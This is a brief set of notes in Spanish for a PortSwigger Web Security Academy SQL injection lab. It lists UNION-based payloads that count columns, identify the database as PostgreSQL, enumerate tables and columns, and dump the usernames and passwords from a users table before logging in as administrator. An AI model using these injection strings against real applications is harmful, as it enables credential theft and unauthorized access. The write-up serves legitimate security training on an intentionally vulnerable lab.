[SQL injection UNION attack, retrieving data from other tables](https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables)

Identificacion de columnas en BD: `' order by 2 -- -`
![[Pasted image 20260403204953.png]]

Verificación de contenido en columnas: `'union select 'a','s' -- -`
![[Pasted image 20260403205119.png]]

Como pasa sin necesidad de un 'from dual' quiere decir que no es oracle, por lo que acotamos ver la version de la BD, probamos con `@@version` para descartar que sea MySQL o Microsoft, pero nos muestra error internal server, por lo que solo quedaria probar con PostgreSQL `version()`
![[Pasted image 20260403205344.png]]

el enunciado de laboratorio nos dice que tenemos que extraer los datos usuario y password de otra tabla, por lo que primero listaremos las tablas:
![[Pasted image 20260403205509.png]]

Localizamos la tabla `users`
![[Pasted image 20260403205615.png]]

Listamos su contenido (columnas): ' union select column_name,null from information_schema.columns where table_name='users' -- -
![[Pasted image 20260403205757.png]]

Ahora que tenemos identificadas las columnas, listaremos el contenido de la columna 'username' y 'password': `'union select username,password from users -- -`
![[Pasted image 20260403205933.png]]

Y por ultimo iniciamos sesion con las credenciales del usuario administrador.
![[Pasted image 20260403210026.png]]
